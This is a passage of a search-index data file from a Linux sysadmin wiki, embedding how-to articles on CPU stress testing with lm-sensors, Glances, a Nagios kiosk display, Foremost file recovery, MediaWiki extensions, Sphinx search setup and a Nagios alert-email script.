4:00.0 # modprobe unknown adapter NVIDIA i2c adapter 1 at 4:00.0 # modprobe unknown adapter NVIDIA i2c adapter 2 at 4:00.0 i2c-nforce2 # Chip drivers eeprom k8temp w83627hf #----cut here---- At this point either restart so that the new kernel modules get loaded or load them by hand with:\nsudo /sbin/modprobe If you load the modules by hand you do not need to restart. Now you can run lm-sensors with:\nsensors and you will get an output like this:\nk8temp-pci-00c3 Adapter: PCI adapter Core0 Temp: +42°C Core1 Temp: +37°C w83627thf-isa-0290 Adapter: ISA adapter VCore: +1.13 V (min = +0.70 V, max = +1.87 V) +12V: +12.77 V (min = +14.53 V, max = +6.81 V) +3.3V: +3.20 V (min = +0.91 V, max = +4.02 V) +5V: +5.04 V (min = +3.33 V, max = +2.91 V) -12V: -12.03 V (min = -7.34 V, max = -1.75 V) V5SB: +5.08 V (min = +0.30 V, max = +1.67 V) VBat: +3.02 V (min = +0.86 V, max = +2.10 V) fan1: 0 RPM (min = 11065 RPM, div = 2) CPU Fan: 4821 RPM (min = 84375 RPM, div = 8) fan3: 6887 RPM (min = 6887 RPM, div = 2) M/B Temp: +41°C (high = +127°C, hyst = +32°C) sensor = thermistor CPU Temp: +41.5°C (high = +80°C, hyst = +75°C) sensor = thermistor temp3: -98.5°C (high = +80°C, hyst = +75°C) sensor = diode vid: +0.000 V (VRM Version 2.4) alarms: Chassis intrusion detection beep_enable: Sound alarm enabled You can further modify the output of lm-sensors by changing the /etc/sensors.conf file, but I will not get into that here. lm-sensors only displays its output once each time you call it, so it only gives you a static image of system statistics. A simple python script will enable you to view the sensor outputs continuously.\n#!/usr/bin/python import os, time while 1: time.sleep(3) os.system('clear') os.system('sensors') Note: you can do the same with this in your terminal:\nwatch sensors This will update the sensor output every three seconds. If you have a CPU that does frequency scaling like an AMD Athlon 64, you can also output the current CPU frequency by adding these lines at the end of the while loop:\nfid = open('/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq', 'rb') print 'CPU0 Frequency:', float(fid.read()) / 1000000, 'GHz' fid.close() If you have more than one CPU core just copy that piece of code multiple times replacing “cpu0” with “cpuN”. Save the script as something like sensors.py and run it with:\npython sensors.py Just hit Ctrl-c to stop the script. Now its time to actually stress the system. I open several terminals, one for each CPU core I have in my system, and run one instance of CPU Burn-In in each of them. This should hopefully get the CPUs running at 100 percent. Next open another terminal and run the python sensor script so you can keep track of temperatures and core frequencies and whatever else lm-sensors is outputting.\nIf you are using Gnome go to System–\u003eAdministration–\u003e“System Monitor” on the top menu bar. This will open System Monitor which is much like the Windows Task Manager and will graphically display various system information. In particular for stress testing, the Resource tab in System Monitor is helpful because it shows the CPU load.\nI usually run the burn in program for a good length of time, like 10 or 12 hours while I am sleeping. Hopefully, when CPU Burn-In finishes it reports a message that no errors were found. If not, reduce your overclock or get some better CPU cooling or maybe your CPU is just defective. Whatever the case, that should be everything you need to stress test the CPU in Linux and view some diagnostics while you do so.\n"
            }
        );
    index.add(
            {
                id:  213 ,
                href: "\/glances-all-in-one-monitoring-shell-tool\/",
                title: "Glances: All in One Monitoring Shell Tool",
                description: "Glances is a cross-platform curses-based monitoring tool written in Python that provides an all-in-one overview of your system health, replacing the need to run multiple monitoring tools simultaneously.",
                content: " Software version 1.6.1/Latest Operating System Debian 7 Website Glances Website Last Update 11/08/2013 Introduction linkGlances is a cross-platform curses-based monitoring tool written in Python.\nIt avoids having to run several tools to get an all-in-one overview of your system. For example, when you want to quickly see what’s wrong on a system for diagnosis, you’ll need to launch top/htop, iostat, vmstat…Glances gives you a large overview of your system health. You can then investigate with the appropriate tool if you want. But you didn’t waste your time opening several tools to get the first desired information: where does the problem come from? So Glances answers that question.\nInstallation linkPackages linkThe glances packages are not yet available in Debian wheezy packages. But they are in Jessie!\nwarning This will upgrade the libc6! That’s why we can do APT pinning to use packages:\n(/etc/apt/preferences)\nPackage: * Pin: release a=wheezy Pin-priority: 900 Package: * Pin: release a=jessie Pin-priority: 100 Package: glances Pin: release a=jessie Pin-priority: 1001 Add as well the jessie repositories to your current wheezy:\n(/etc/apt/sources.list)\ndeb http://ftp.fr.debian.org/debian/ jessie main contrib non-free deb-src http://ftp.fr.debian.org/debian/ jessie main contrib non-free Now update and install glances:\naptitude update aptitude install glances Pip linkYou can install the latest version of Glances using pip. First install dependencies:\naptitude install python-pip python-dev Then install Glances:\npip install Glances You’re now able to launch glances in command line:\nglances Upgrade linkTo upgrade your Glances version:\npip install --upgrade glances Configuration linkThere is nothing especially to configure as default options could be enough for a large set of users. Anyway, you can add or change several options of the default configuration in /etc/glances.glances.conf.\nAn option that comes with 1.7 version is the possibility to watch a specific software. Let’s say Nginx for instance. You can ask glance to look at it by adding these lines:\n(/etc/glances.glances.conf)\n[monitor] list_1_description=Web Nginx Server list_1_regex=.*nginx.* list_1_command=nginx -v list_1_countmin=1 list_1_countmax=4 list_X: replace X by 1 to 9, this is the information for additional software (here Nginx) description: set the software description (16 chars max) regex: regex to group software information command: the command to run that will show information in glances countmin: minimum number of information to show countmax: maximum number of information to show You can add other software by adding same lines with list_2, list_3…\nClient/Server mode linkThere is also a client/server mode. You can run a server like this:\nglances -s And you can connect clients:\nglances -c Replace by the server IP.\nReferences link https://github.com/nicolargo/glances "
            }
        );
    index.add(
            {
                id:  214 ,
                href: "\/How_to_install_and_configure_a_monitoring_machine_for_supervision\/",
                title: "How to install and configure a monitoring machine for supervision",
                description: "A guide on quickly setting up a monitoring machine with Nagios/Shinken for supervision purposes with automatic login and minimal interaction requirements.",
                content: " Operating System Debian 7 Last Update 08/08/2013 Introduction linkThe goal of this documentation is how to quickly setup a monitoring machine on Nagios/Shinken:\nThe idea is to have a machine that nobody never touch once installed. It’s always boring to plug a keyboard and a mouse when somethings goes wrong on this kind of machine. That’s why we’ll see how to setup a minimal installation with all requirements to satisfy those needs.\nInstallation linkInstall a Debian wheezy with a SSH server and additional utilities but without any X server or Window Manager and create an ‘monitoring’ user. Once done, connect with SSH on the machine install install those packages:\naptitude install xserver-xorg-core xorg awesome slim iceweasel wmctrl We’re installing iceweasel to get all dependencies of Firefox satisfied, but as we don’t want any Iceweasel update break our configuration, we’re going to install firefox:\nwget ftp://ftp.mozilla.org/pub/firefox/releases/22.0/linux-x86_64/fr/firefox-22.0.tar.bz2 tar -xjf firefox-22.0.tar.bz2 mv firefox /usr/share/ rm firefox-22.0.tar.bz2 ln -s /usr/share/firefox/firefox /usr/bin/ chown -Rf monitoring /usr/share/firefox/firefox Now we’re ready for the configuration.\nConfiguration linkslim linkThe configuration of slim is simple: we want to boot awesome without any credentials questions:\n# NOTE: if your system does not have bash you need # to adjust the command according to your preferred shell, # i.e. for freebsd use: login_cmd exec /bin/sh - ~/.xinitrc %session ##login_cmd exec /bin/bash -login /etc/X11/Xsession %session [...] sessions awesome [...] # default user, leave blank or remove this line # for avoid pre-loading the username. default_user monitoring [...] # Automatically login the default user (without entering # the password. Set to \"yes\" to enable this feature auto_login yes Awesome linkAwesome should be configured to launch firefox in fullscreen mode automatically at startup. That’s why we need to create a configuration file and then modify it. Login with monitoring user and copy the default config:\nmkdir -p .config/awesome cp /etc/xdg/awesome/rc.lua .config/awesome/ Then edit the configuration file and modify/add those lines:\n[...] layouts = { awful.layout.suit.max.fullscreen, awful.layout.suit.floating, awful.layout.suit.tile, awful.layout.suit.tile.left, awful.layout.suit.tile.bottom, awful.layout.suit.tile.top, awful.layout.suit.fair, awful.layout.suit.fair.horizontal, awful.layout.suit.spiral, awful.layout.suit.spiral.dwindle, awful.layout.suit.max, awful.layout.suit.magnifier } [...] -- Move mouse to a corner local safeCoords = {x=0, y=60} local moveMouseOnStartup = true local function moveMouse(x_co, y_co) mouse.coords({ x=x_co, y=y_co }) end if moveMouseOnStartup then moveMouse(safeCoords.x, safeCoords.y) end -- Launch Firefox at startup awful.util.spawn_with_shell(\"firefox\") As you can see, we’re moving the mouse at boot instead of hiding it with slim. It’s preferable to have the possibility to use it if we really need it than changing the configuration and reboot instead.\nFirefox linkLaunch firefox and install a fullscreen extension to autohide everything. You also need to change the “about:config” to set to false this parameter:\nbrowser.sessionstore.resume_from_crash To finish, disable automatic update and configure the URL with Nagios:\nhttps://nagios.deimos.fr/cgi-bin/status.cgi?host=all\u0026servicestatustypes=28\u0026hoststatustypes=3\u0026serviceprops=42\u0026sorttype=1\u0026sortoption=6\u0026noheader Or if you prefer Thruk:\nhttps://nagios.deimos.fr/thruk/cgi-bin/status.cgi?serviceprops=42\u0026servicestatustypes=28\u0026sortoption=6\u0026type=detail\u0026sorttype=1\u0026host=all\u0026hostprops=10\u0026minimal=1 Screensaver linkAnother interesting thing is to disable the screensaver :-D. And add in xinitrc:\n#!/bin/sh # Disable screen shutdown xset -dpms xset s off # Launch Window Manager exec awesome \u003e\u003e ~/.cache/awesome/stdout 2\u003e\u003e ~/.cache/awesome/stderr And create the folder that doesn’t exist:\nmkdir -p ~/.cache/awesome Powersaving linkAs I’m a green IT, I don’t want the monitoring machine to be up \u0026 running 24/24h 7/7j. That’s why in the BIOS, I’ve set it up to start automatically at the wished hour. And I added this in the root crontab to autoswitch off correctly Firefox (using wmctrl is necessary are there is a bug on Firefox with SIGINT for more than 10 years):\nPATH=/usr/bin:/sbin:/bin 0 20 * * * export DISPLAY=:0 ; su - monitoring -c \"wmctrl -c firefox\" ; halt "
            }
        );
    index.add(
            {
                id:  215 ,
                href: "\/Foremost_:_r%C3%A9cup%C3%A9rer_des_donn%C3%A9es_supprim%C3%A9es\/",
                title: "Foremost: Recover Deleted Data",
                description: "How to use the Foremost forensic tool to recover deleted files based on their headers, footers, and internal data structures",
                content: "Introduction linkForemost is a forensics application to recover files based on their headers, footers, and internal data structures. Foremost can work on image files, such as those generated by dd, Safeback, Encase, etc, or directly on a drive. This short article shows how you can use foremost to recover deleted files.\nI do not issue any guarantee that this will work for you!\nCurrently foremost can recover the following file types:\njpg - Support for the JFIF and Exif formats including implementations used in modern digital cameras. gif png bmp - Support for windows bmp format. avi exe - Support for Windows PE binaries, will extract DLL and EXE files along with their compile times. mpg - Support for most MPEG files (must begin with 0x000001BA) wav riff - This will extract AVI and RIFF since they use the same file format (RIFF). note faster than running each separately. wmv - Note may also extract -wma files as they have similar format. mov pdf ole - This will grab any file using the OLE file structure. This includes PowerPoint, Word, Excel, Access, and StarWriter doc - Note it is more efficient to run OLE as you get more bang for your buck. If you wish to ignore all other ole files then use this. zip - Note is will extract .jar files as well because they use a similar format. Open Office docs are just zipped XML files so they are extracted as well. These include SXW, SXC, SXI, and SX? for undetermined OpenOffice files. rar htm cpp - C source code detection, note this is primitive and may generate documents other than C code. You can tweak /etc/foremost.conf to add support for more file types.\nPlease note that there’s no guarantee that foremost will succeed in recovering your files, but at least there’s a chance.\nInstallation linkInstall first Foremost:\napt-get install foremost Configuration linkTake a look at\nman foremost to learn how to use foremost.\nIn this example I delete a jpg file:\nserver1:/home/administrator# ls -l total 324 -rw-r--r-- 1 root root 324383 2008-02-19 01:25 k-p1170003_13_20080217_1058163689.jpg server1:/home/administrator# rm -f k-p1170003_13_20080217_1058163689.jpg foremost can be used as follows to try to recover the file:\nforemost -t jpeg -i /dev/sda1 (If you don’t know what partition to search, take a look at\nserver1:~# mount /dev/sda1 on / type ext3 (rw,errors=remount-ro) tmpfs on /lib/init/rw type tmpfs (rw,nosuid,mode=0755) proc on /proc type proc (rw,noexec,nosuid,nodev) sysfs on /sys type sysfs (rw,noexec,nosuid,nodev) udev on /dev type tmpfs (rw,mode=0755) tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev) devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=620) nfsd on /proc/fs/nfsd type nfsd (rw) server1:~# After foremost has finished, you will find a folder called output in the directory from where you called foremost:\nserver1:~# ls -la total 36 drwxr-xr-x 5 root root 4096 2009-03-12 17:53 . drwxr-xr-x 21 root root 4096 2009-02-16 13:10 .. drwx------ 2 root root 4096 2009-02-16 13:15 .aptitude -rw------- 1 root root 377 2009-02-16 13:32 .bash_history -rw-r--r-- 1 root root 412 2004-12-15 23:53 .bashrc drwxr-xr-x 2 root root 4096 2009-02-16 13:17 .debtags drwxr-xr-- 3 root root 4096 2009-03-12 17:53 output -rw-r--r-- 1 root root 140 2007-11-19 18:57 .profile -rw------- 1 root root 3480 2009-03-12 17:06 .viminfo server1:~# server1:~# ls -l output/ total 8 -rw-r--r-- 1 root root 714 2009-03-12 18:02 audit.txt drwxr-xr-- 2 root root 4096 2009-03-12 17:57 jpg server1:~# The audit.txt contains a summary of what foremost has done:\nserver1:~# cat output/audit.txt Foremost version 1.5.4 by Jesse Kornblum, Kris Kendall, and Nick Mikus Audit File Foremost started at Thu Mar 12 17:53:48 2009 Invocation: foremost -t jpeg -i /dev/sda1 Output directory: /root/output Configuration file: /etc/foremost.conf ------------------------------------------------------------------ File: /dev/sda1 Start: Thu Mar 12 17:53:48 2009 Length: 28 GB (30836542464 bytes) Num Name (bs=512) Size File Offset Comment 0: 11157504.jpg 320 KB 5712642048 1: 29556752.jpg 324 KB 15133057024 Finish: Thu Mar 12 18:02:10 2009 2 FILES EXTRACTED jpg:= 2 ------------------------------------------------------------------ Foremost finished at Thu Mar 12 18:02:10 2009 server1:~# And the jpg/ subdirectory contains the jpg files that foremost has recovered:\nserver1:~# ls -l output/jpg/ total 660 -rw-r--r-- 1 root root 328479 2009-03-12 17:55 11157504.jpg -rw-r--r-- 1 root root 332575 2009-03-12 17:57 29556752.jpg server1:~# Before you run foremost the next time from the same directory, you must either delete/rename the current output/ directory (because foremost will not start if there’s already an output/ directory) or use the -T switch (time stamp the output directory so you don’t have to delete the output/ dir when running multiple times):\nforemost -t pdf -T -i /dev/sda1 Resources linkhttp://www.howtoforge.com/recover-deleted-files-with-foremost\n"
            }
        );
    index.add(
            {
                id:  216 ,
                href: "\/Les_extentions_pratiques_de_Mediawiki\/",
                title: "Practical Extensions for MediaWiki",
                description: "A comprehensive guide to useful MediaWiki extensions including Google Analytics, Search, Ads, Syntax highlighting, and other useful tools to enhance functionality.",
                content: "Introduction linkMediaWiki has extensions that add interesting functionality. The only downside of these extensions is that they can become obsolete with version changes. It’s up to you to decide…however, some are only used occasionally.\nExtensions linkSpecialRenameuser.php linkThis extension is provided in Debian repositories, so I recommend installing it with apt. Otherwise, it’s available here. Then you just need to link it:\ncd /etc/mediawiki-extensions/extensions-enabled ln -s /usr/share/mediawiki-extensions/SpecialRenameuser.php ./ Now, if you go to the Special pages, you’ll have the ability to rename a user.\nDeleteHistory linkI developed this extension (DeleteHistory) myself. It allows you to delete the history of your articles. Besides leaving some traces (passwords, confidential information…), you might wonder why not keep the history.\nI had the idea to create it because I previously used SpecialDeleteOldRevisions, but the developer wasn’t reactive enough for my taste to update his extension and make it work everywhere. Moreover, he developed the entire deletion part himself, which certainly has advantages, but also a major disadvantage: it’s not maintained by the MediaWiki team, and if changes to the database happen during an upgrade, the extension must be modified to accommodate these changes.\nFor my extension, I simply opted for a maintenance script provided by MediaWiki, which removes the problem mentioned above and allows me to be compatible with many different versions.\nDepending on your wiki’s purpose, this may or may not be important. But for mine, it’s not very important!\nThis extension is available here. For those of you who are less interested, let me give you some numbers to consider. In one year of wiki usage, my database was 14 MB. With this extension that removes histories, I was able to reduce it to 4.8 MB. You can see the gain you can achieve by removing histories!\nGoogle Ads linkFor Google Adsense, you must first create an account and then generate ad banners of your desired size.\nWithout skin modification linkYou need to install the PCR GUI Inserts module which will allow you to insert information at various places on your pages. First, activate the extension by adding these lines:\n# PCR Extension for Piwik / Google Ads require_once(\"$IP/extensions/pcr/pcr_guii.php\"); Bottom section linkHere are the lines to add to have a bottom section with Google ads:\n# Google Ads (bottom page) $wgPCRguii_Inserts['SkinAfterBottomScripts']['on'] = true; $wgPCRguii_Inserts['SkinAfterBottomScripts']['content'] = ' '; With skin modification linkThe disadvantage of this method is that when you update MediaWiki, these modifications are likely to be overwritten. You will then have to redo the configuration. Opt for the manual method if you want to be worry-free.\nMonobook linkBottom section linkInsert these lines in the file mediawiki/skins/Monobook.php:\nTo be added below:\nLeft section link Google Ads And place it above this section:\n\u003c?php if($this-\u003edata['poweredbyico']) { ?\u003e \u003c?php $this-\u003ehtml('poweredbyico') ?\u003e \u003c?php } if($this-\u003edata['copyrightico']) { ?\u003e \u003c?php $this-\u003ehtml('copyrightico') ?\u003e Vector linkBottom section linkInsert these lines in the file mediawiki/skins/Vector.php:\nTo add in this section:\n\u003c?php endforeach; ?\u003e \u003c?php endif; ?\u003e /* THE CODE HERE!!! */ Left section linkInsert these lines in the file mediawiki/skins/Vector.php:\nTo add in this section:\n"
            }
        );
    index.add(
            {
                id:  217 ,
                href: "\/Sphinx_:_setup_a_full_text_indexer\/",
                title: "Sphinx: Setup a Full Text Indexer",
                description: "Guide on setting up Sphinx, an open source full text search server, with specific instructions for MediaWiki integration and configuration.",
                content: " Software version 2.0.4 Operating System Debian 7 Website Sphinx Search Website Last Update 02/08/2013 Introduction linkSphinx is an open source full text search server, designed from the ground up with performance, relevance (aka search quality), and integration simplicity in mind. It’s written in C++ and works on Linux (RedHat, Ubuntu, etc), Windows, MacOS, Solaris, FreeBSD, and a few other systems.\nSphinx lets you either batch index and search data stored in an SQL database, NoSQL storage, or just files quickly and easily — or index and search data on the fly, working with Sphinx pretty much as with a database server. A variety of text processing features enable fine-tuning Sphinx for your particular application requirements, and a number of relevance functions ensures you can tweak search quality as well. Searching via SphinxAPI is as simple as 3 lines of code, and querying via SphinxQL is even simpler, with search queries expressed in good old SQL.\nSphinx clusters scale up to tens of billions of documents and hundreds of millions search queries per day, powering top websites such as Craigslist, Living Social, MetaCafe and Groupon… to view a complete list of known users please visit our Powered-by page. And last but not least, it’s open-sourced under GPLv2, and the community edition is free to use.\nInstallation linkTo install Sphinx on Debian, this is simple:\naptitude install sphinxsearch Configuration linkFirst of all, you need to setup the application configuration for Sphinx before starting the indexation.\nMediaWiki linkInstall plugin linkFirst of all, we need to get the MediaWiki plugin1 to get the sphinx config with and deploy:\ncd /var/www/mediawiki/extension git clone https://gerrit.wikimedia.org/r/p/mediawiki/extensions/SphinxSearch.git cd SphinxSearch cp sphinx.conf /etc/sphinxsearch/ You will also need to get the PHP client API. The biggest problem here is to find the one that match your Sphinx version. I had several problem regarding that point and I strongly suggest that you take time to choose the best corresponding one for your version: http://code.google.com/p/sphinxsearch/source/browse/#svn%2Ftags.\nFor Debian 7 and the version installed with, you need to take this one:\nwget http://sphinxsearch.googlecode.com/svn/tags/REL_1_10/api/sphinxapi.php You also can take the logo to add it just next to the Mediawiki logo (this is optional):\nmkdir -p skins/images wget -O skins/images/Powered_by_sphinx.png http://upload.wikimedia.org/wikipedia/mediawiki/8/8e/Powered_by_sphinx.png Configure linkEdit the configuration file and fulfill the informations with your mediawiki database (/etc/sphinxsearch/sphinx.conf):\n# # Sphinx configuration for MediaWiki # # Based on examples by Paul Grinberg at http://www.mediawiki.org/wiki/Extension:SphinxSearch # and Hank at http://www.ralree.info/2007/9/15/fulltext-indexing-wikipedia-with-sphinx # Modified by Svemir Brkic for http://www.newworldencyclopedia.org/ # # Released under GNU General Public License (see http://www.fsf.org/licenses/gpl.html) # # Latest version available at http://www.mediawiki.org/wiki/Extension:SphinxSearch # data source definition for the main index source src_wiki_main { # data source type\t= mysql sql_host\t= localhost sql_db\t= wikidb sql_user\t= user sql_pass\t= password # these two are optional #sql_port\t= 3306 #sql_sock\t= /var/lib/mysql/mysql.sock # pre-query, executed before the main fetch query sql_query_pre\t= SET NAMES utf8 # main document fetch query - change the table names if you are using a prefix sql_query\t= SELECT page_id, page_title, page_namespace, page_is_redirect, old_id, old_text FROM wiki_page, wiki_revision, wiki_text WHERE rev_id=page_latest AND old_id=rev_text_id # attribute columns sql_attr_uint\t= page_namespace sql_attr_uint\t= page_is_redirect sql_attr_uint\t= old_id # collect all category ids for category filtering sql_attr_multi = uint category from query; SELECT cl_from, page_id AS category FROM wiki_categorylinks, wiki_page WHERE page_title=cl_to AND page_namespace=14 # used by command-line search utility to display document information sql_query_info\t= SELECT page_title, page_namespace FROM wiki_page WHERE page_id=$id } # data source definition for the incremental index source src_wiki_incremental : src_wiki_main { # adjust this query based on the time you run the full index # in this case, full index runs at 7 AM UTC sql_query\t= SELECT page_id, page_title, page_namespace, page_is_redirect, old_id, old_text FROM wiki_page, wiki_revision, wiki_text WHERE rev_id=page_latest AND old_id=rev_text_id AND page_touched\u003e=DATE_FORMAT(CURDATE(), '%Y%m%d070000') # all other parameters are copied from the parent source } # main index definition index wiki_main { # which document source to index source\t= src_wiki_main # this is path and index file name without extension # you may need to change this path or create this folder path\t= /var/lib/sphinxsearch/data/wiki_main # docinfo (ie. per-document attribute values) storage strategy docinfo\t= extern # morphology (comment it if your wiki is not full english) # morphology\t= stem_en # stopwords file #stopwords\t= /var/data/sphinx/stopwords.txt # minimum word length min_word_len\t= 1 # allow wildcard (*) searches min_infix_len = 1 enable_star = 1 # charset encoding type charset_type\t= utf-8 # charset definition and case folding rules \"table\" charset_table\t= 0..9, A..Z-\u003ea..z, a..z, \\ U+C0-\u003ea, U+C1-\u003ea, U+C2-\u003ea, U+C3-\u003ea, U+C4-\u003ea, U+C5-\u003ea, U+C6-\u003ea, \\ U+C7-\u003ec,U+E7-\u003ec, U+C8-\u003ee, U+C9-\u003ee, U+CA-\u003ee, U+CB-\u003ee, U+CC-\u003ei, \\ U+CD-\u003ei, U+CE-\u003ei, U+CF-\u003ei, U+D0-\u003ed, U+D1-\u003en, U+D2-\u003eo, U+D3-\u003eo, \\ U+D4-\u003eo, U+D5-\u003eo, U+D6-\u003eo, U+D8-\u003eo, U+D9-\u003eu, U+DA-\u003eu, U+DB-\u003eu, \\ U+DC-\u003eu, U+DD-\u003ey, U+DE-\u003et, U+DF-\u003es, \\ U+E0-\u003ea, U+E1-\u003ea, U+E2-\u003ea, U+E3-\u003ea, U+E4-\u003ea, U+E5-\u003ea, U+E6-\u003ea, \\ U+E7-\u003ec,U+E7-\u003ec, U+E8-\u003ee, U+E9-\u003ee, U+EA-\u003ee, U+EB-\u003ee, U+EC-\u003ei, \\ U+ED-\u003ei, U+EE-\u003ei, U+EF-\u003ei, U+F0-\u003ed, U+F1-\u003en, U+F2-\u003eo, U+F3-\u003eo, \\ U+F4-\u003eo, U+F5-\u003eo, U+F6-\u003eo, U+F8-\u003eo, U+F9-\u003eu, U+FA-\u003eu, U+FB-\u003eu, \\ U+FC-\u003eu, U+FD-\u003ey, U+FE-\u003et, U+FF-\u003es, } # incremental index definition index wiki_incremental : wiki_main { path\t= /var/lib/sphinxsearch/data/wiki_incremental source\t= src_wiki_incremental } # indexer settings indexer { # memory limit (default is 32M) mem_limit\t= 64M } # searchd settings searchd { # IP address and port on which search daemon will bind and accept listen\t= 127.0.0.1:9312 # searchd run info is logged here - create or change the folder log\t= /var/log/sphinxsearch/searchd.log # all the search queries are logged here query_log\t= /var/log/sphinxsearch/query.log # client read timeout, seconds read_timeout\t= 5 # maximum amount of children to fork max_children\t= 30 # a file which will contain searchd process ID pid_file\t= /var/run/sphinxsearch/searchd.pid # maximum amount of matches this daemon would ever retrieve # from each index and serve to client max_matches\t= 1000 # Remove warning of deprecated function compat_sphinxql_magics = 0 } # --eof-- Others infos you need to know:\nAdapt the tables if you use a prefix (like you can see here with ‘wiki_’) on the SQL requests I’ve also modified all paths to match in Debian’s ones All highlighted lines are important, I’ve added a comment on each that needed to bring additional informations Now you should perform an indexation of the wiki.\nThen we are going to configure the MediaWiki plugin. add those lines to your LocalSettings.php:\n# Sphinx search $wgEnableMWSuggest = true; $wgSearchType = 'SphinxMWSearch'; $wgFooterIcons['poweredby']['sphinxsearch'] = array( 'src' =\u003e \"$wgScriptPath/extensions/SphinxSearch/skins/images/Powered_by_sphinx.png\", 'url' =\u003e 'http://www.mediawiki.org/wiki/Extension:SphinxSearch', 'alt' =\u003e 'Search Powered by Sphinx', ); require_once( \"$IP/extensions/SphinxSearch/SphinxSearch.php\" ); Then you’ll be able to make search with sphinx :-)\nSphinx default linkTo permit to the deamon to start on boot, simply edit that file and change ’no’ to ‘yes’ (/etc/default/sphinxsearch):\n# Settings for the sphinxsearch searchd daemon # Please read /usr/share/doc/sphinxsearch/README.Debian for details. # # Should sphinxsearch run automatically on startup? (default: no) # Before doing this you might want to modify /etc/sphinxsearch/sphinx.conf # so that it works for you. START=yes Indexation linkIndex linkYou need to create a first indexation once you’ve configured your application. To prepare sphinx to search:\n\u003e indexer --config /etc/sphinxsearch/sphinx.conf --all Sphinx 2.0.4-release (r3135) Copyright (c) 2001-2012, Andrew Aksyonoff Copyright (c) 2008-2012, Sphinx Technologies Inc (http://sphinxsearch.com) using config file '/etc/sphinxsearch/sphinx.conf'... indexing index 'wiki_main'... collected 1987 docs, 5.1 MB collected 37 attr values sorted 0.0 Mvalues, 100.0% done sorted 21.5 Mhits, 100.0% done total 1987 docs, 5053410 bytes total 5.859 sec, 862461 bytes/sec, 339.11 docs/sec indexing index 'wiki_incremental'... collected 8 docs, 0.0 MB collected 37 attr values sorted 0.0 Mvalues, 100.0% done sorted 0.1 Mhits, 100.0% done total 8 docs, 12505 bytes total 0.016 sec, 751141 bytes/sec, 480.53 docs/sec total 139 reads, 0.018 sec, 359.0 kb/call avg, 0.1 msec/call avg total 133 writes, 0.076 sec, 781.3 kb/call avg, 0.5 msec/call avg rotating indices: succesfully sent SIGHUP to searchd (pid=22053). If this is the first time and it works (no configuration problem), start the deamon (you’ll to have setup this before):\nservice sphinxsearch start Test your indexation linkThere are several way to test your indexation but you need to know that the search binary contains bugs. If it crash, it doesn’t mean that you have a problem with. Anyway, here is how to test:\n\u003e search -q --config /etc/sphinxsearch/sphinx.conf \"test\" Sphinx 2.0.4-release (r3135) Copyright (c) 2001-2012, Andrew Aksyonoff Copyright (c) 2008-2012, Sphinx Technologies Inc (http://sphinxsearch.com) using config file '/etc/sphinxsearch/sphinx.conf'... index 'wiki_main': query 'test ': returned 119 matches of 119 total in 0.000 sec 1. document=2020, weight=1670, page_namespace=0, page_is_redirect=0, old_id=12125, category=() 2. document=1024, weight=1669, page_namespace=0, page_is_redirect=0, old_id=9383, category=() 3. document=3323, weight=1668, page_namespace=0, page_is_redirect=0, old_id=10361, category=() [...] 20. document=1776, weight=1639, page_namespace=0, page_is_redirect=0, old_id=9510, category=(2575,2577,2578) words: 1. 'test': 119 documents, 346 hits index 'wiki_incremental': query 'test ': returned 0 matches of 0 total in 0.000 sec words: 1. 'test': 0 documents, 0 hits As you can see, we have results here :-). The work “test” have been found 20 times.\nIncremental updates linkWe need to setup the incremental updates. Change it to a slower value if you need to have more often indexation. For my own usage, once by hour, is really enough. I’ve added the MediaWiki example here (/etc/cron.d/sphinxsearch):\n# Rebuild all indexes daily and notify searchd. @daily root . /etc/default/sphinxsearch \u0026\u0026 if [ \"$START\" = \"yes\" ] \u0026\u0026 [ -x /usr/bin/indexer ]; then /usr/bin/indexer --quiet --rotate --all \u003e/dev/null 2\u003e\u00261 ; fi # Example for rotating only specific indexes (usually these would be part of # a larger combined index). # */5 * * * * root [ -x /usr/bin/indexer ] \u0026\u0026 /usr/bin/indexer --quiet --rotate postdelta threaddelta \u003e/dev/null 2\u003e\u00261 # Mediawiki 0 */1 * * * root [ -x /usr/bin/indexer ] \u0026\u0026 indexer wiki_incremental --quiet --rotate \u003e/dev/null 2\u003e\u00261 Debug linkWhat if you don’t see any results or you want to be sure that Sphinx receive search requests? There is a console mode:\n\u003e searchd --console --config /etc/sphinxsearch/sphinx.conf --pidfile Sphinx 2.0.4-release (r3135) Copyright (c) 2001-2012, Andrew Aksyonoff Copyright (c) 2008-2012, Sphinx Technologies Inc (http://sphinxsearch.com) using config file '/etc/sphinxsearch/sphinx.conf'... listening on 127.0.0.1:9312 accepting connections [Fri Aug 2 14:19:15.652 2013] 0.000 sec [ext2/2/rel 50 (0,20)] [*] test I see my test search here :-). All is good! If you don’t see anything, that should be a problem with the application API or a missmatch configuration. You can also check with tcpdump if you see network connections arriving on 9312 port.\nFAQ linkI don’t see any search result on MediaWiki, why? linkYou certainly have a problem with your php API. Select another version that should match. Check also the Debug part to help you to see what’s wrong.\nReferences link http://www.mediawiki.org/wiki/Extension:SphinxSearch ↩︎\n"
            }
        );
    index.add(
            {
                id:  218 ,
                href: "\/Emails_r%C3%A9capitulatif_des_alertes_Nagios_en_cours\/",
                title: "Email Summary of Current Nagios Alerts",
                description: "A script that sends an email summary of current Nagios alerts, allowing you to check server status before arriving at work.",
                content: " Software version Core 3.2.1 Operating System Debian 6 Website Nagios Website Last Update 08/02/2013 Introduction linkI’ve used this tool found on the internet for a long time, then further developed it with a former colleague. It allows you to receive an email with Nagios alerts. We used it to receive these emails before arriving at work to know what issues were happening. This helps you arrive either running or calmly :-)\nThis script parses the Nagios web interface, retrieves minimal information for good smartphone display, and sends an email. Just add it to crontab to receive this in the morning or whenever you want.\nInstallation linkYou’ll need Perl and some dependencies:\naptitude install liblwp-useragent-determined-perl libemail-sender-perl Configuration link #!/usr/bin/perl -w # Inspired by Rob Moss, 2005-07-26, coding@mossko.com # Created by Charles-Henri TURPIN # Modified by Pierre Mavro ########################################################################################### my $mailsmtp\t=\t'smtp.deimos.fr'; #\tFill these in! my $mailfrom = 'xxx@mycompany.com'; # Coming from above my $mailto\t=\t'xxx@mycompany.com'; # Set defautls receivers my $mailsubject\t=\t'Morning Checks'; ########################################################################################### package Service; sub const { my ($classe, $hostname, $name, $duration, $message, $color) = @_; #la fonction reçoit comme premier paramètre le nom de la classe my $this = {\"hostname\" =\u003e \"hostname\", \"name\" =\u003e \"name\", \"duration\" =\u003e \"duration\", \"message\" =\u003e \"message\", \"color\" =\u003e \"color\",}; $this-\u003e{\"hostname\"} = $hostname if defined 